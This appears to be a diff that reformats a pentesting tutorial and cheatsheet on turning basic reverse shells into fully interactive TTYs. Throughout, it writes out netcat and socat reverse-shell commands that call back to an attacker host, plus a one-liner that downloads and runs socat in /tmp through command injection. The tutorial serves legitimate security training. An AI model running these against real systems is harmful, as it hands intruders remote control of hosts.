@@ -31,15 +31,15 @@ For reference, in all the screenshots and commands to follow, I am injecting com
 
 Everyone is pretty familiar with the traditional way of using netcat to get a reverse shell:
 
-|                 |                                               |
-| --------------- | --------------------------------------------- |
-| ```<br>1<br>``` | ```bash<br>nc -e /bin/sh 10.0.3.4 4444<br>``` |
+|             |                                           |
+| ----------- | ----------------------------------------- |
+| `<br>1<br>` | `bash<br>nc -e /bin/sh 10.0.3.4 4444<br>` |
 
 and catching it with:
 
-|                 |                                |
-| --------------- | ------------------------------ |
-| ```<br>1<br>``` | ```bash<br>nc -lvp 4444<br>``` |
+|             |                            |
+| ----------- | -------------------------- |
+| `<br>1<br>` | `bash<br>nc -lvp 4444<br>` |
 
 The problem is not every server has netcat installed, and not every version of netcat has the `-e` option.
 
@@ -63,9 +63,9 @@ These can all be caught by using netcat and listening on the port specified (444
 
 One of my go-to commands for a long time after catching a dumb shell was to use Python to spawn a pty. The [pty module](https://docs.python.org/2/library/pty.html) let’s you spawn a psuedo-terminal that can fool commands like `su` into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command:
 
-|                 |                                                                  |
-| --------------- | ---------------------------------------------------------------- |
-| ```<br>1<br>``` | ```bash<br>python -c 'import pty; pty.spawn("/bin/bash")'<br>``` |
+|             |                                                              |
+| ----------- | ------------------------------------------------------------ |
+| `<br>1<br>` | `bash<br>python -c 'import pty; pty.spawn("/bin/bash")'<br>` |
 
 This will let you run `su` for example (in addition to giving you a nicer prompt)
 
@@ -83,15 +83,15 @@ The following commands will yield a fully interactive TTY reverse shell:
 
 **On Kali (listen)**:
 
-|                 |                                                               |
-| --------------- | ------------------------------------------------------------- |
-| ```<br>1<br>``` | ```bash<br>socat file:`tty`,raw,echo=0 tcp-listen:4444<br>``` |
+|             |                                                               |
+| ----------- | ------------------------------------------------------------- |
+| `<br>1<br>` | `` bash<br>socat file:`tty`,raw,echo=0 tcp-listen:4444<br> `` |
 
 **On Victim (launch)**:
 
-|                 |                                                                                         |
-| --------------- | --------------------------------------------------------------------------------------- |
-| ```<br>1<br>``` | ```bash<br>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444<br>``` |
+|             |                                                                                     |
+| ----------- | ----------------------------------------------------------------------------------- |
+| `<br>1<br>` | `bash<br>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444<br>` |
 
 If socat isn’t installed, you’re not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:
 
@@ -99,9 +99,9 @@ If socat isn’t installed, you’re not out of luck. There are standalone binar
 
 With a command injection vuln, it’s possible to download the correct architecture `socat` binary to a writable directoy, chmod it, then execute a reverse shell in one line:
 
-|                 |                                                                                                                                                                                                                             |
-| --------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| ```<br>1<br>``` | ```bash<br>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444<br>``` |
+|             |                                                                                                                                                                                                                         |
+| ----------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `<br>1<br>` | `bash<br>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444<br>` |
 
 On Kali, you’ll catch a fully interactive TTY session. It supports tab-completion, SIGINT/SIGSTP support, vim, up arrow history, etc. It’s a full terminal. Pretty sweet.
 
@@ -123,9 +123,9 @@ The information needed is the TERM type (_“xterm-256color”_) and the size of
 
 With the shell still backgrounded, now set the current STTY to type raw and tell it to echo the input characters with the following command:
 
-|                 |                                  |
-| --------------- | -------------------------------- |
-| ```<br>1<br>``` | ```bash<br>stty raw -echo<br>``` |
+|             |                              |
+| ----------- | ---------------------------- |
+| `<br>1<br>` | `bash<br>stty raw -echo<br>` |
 
 With a raw stty, input/output will look weird and you won’t see the next commands, but as you type they are being processed.
 
@@ -137,9 +137,9 @@ _Note: I did not type the `nc` command again (as it might look above). I actuall
 
 After the `reset` the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)
 
-|                           |                                                                                                     |
-| ------------------------- | --------------------------------------------------------------------------------------------------- |
-| ```<br>1<br>2<br>3<br>``` | ```bash<br>$ export SHELL=bash<br>$ export TERM=xterm256-color<br>$ stty rows 38 columns 116<br>``` |
+|                       |                                                                                                 |
+| --------------------- | ----------------------------------------------------------------------------------------------- |
+| `<br>1<br>2<br>3<br>` | `bash<br>$ export SHELL=bash<br>$ export TERM=xterm256-color<br>$ stty rows 38 columns 116<br>` |
 
 The end result is a fully interactive TTY with all the features we’d expect (tab-complete, history, job control, etc) all over a netcat connection:
 
@@ -155,18 +155,18 @@ Cheatsheet commands:
 
 **Using Python for a psuedo terminal**
 
-|                 |                                                                  |
-| --------------- | ---------------------------------------------------------------- |
-| ```<br>1<br>``` | ```bash<br>python -c 'import pty; pty.spawn("/bin/bash")'<br>``` |
+|             |                                                              |
+| ----------- | ------------------------------------------------------------ |
+| `<br>1<br>` | `bash<br>python -c 'import pty; pty.spawn("/bin/bash")'<br>` |
 
 **Using socat**
 
-|                                     |                                                                                                                                                                      |
-| ----------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```bash<br>#Listener:<br>socat file:`tty`,raw,echo=0 tcp-listen:4444<br><br>#Victim:<br>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444<br>``` |
+|                                 |                                                                                                                                                                      |
+| ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `<br>1<br>2<br>3<br>4<br>5<br>` | `` bash<br>#Listener:<br>socat file:`tty`,raw,echo=0 tcp-listen:4444<br><br>#Victim:<br>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444<br> `` |
 
 **Using stty options**
 
-|                                                                                          |                                                                                                                                                                                                                                                                                 |
-| ---------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| ```<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>``` | ```bash<br># In reverse shell<br>$ python -c 'import pty; pty.spawn("/bin/bash")'<br>Ctrl-Z<br><br># In Kali<br>$ stty raw -echo<br>$ fg<br><br># In reverse shell<br>$ reset<br>$ export SHELL=bash<br>$ export TERM=xterm-256color<br>$ stty rows <num> columns <cols><br>``` |
+|                                                                                      |                                                                                                                                                                                                                                                                             |
+| ------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>` | `bash<br># In reverse shell<br>$ python -c 'import pty; pty.spawn("/bin/bash")'<br>Ctrl-Z<br><br># In Kali<br>$ stty raw -echo<br>$ fg<br><br># In reverse shell<br>$ reset<br>$ export SHELL=bash<br>$ export TERM=xterm-256color<br>$ stty rows <num> columns <cols><br>` |
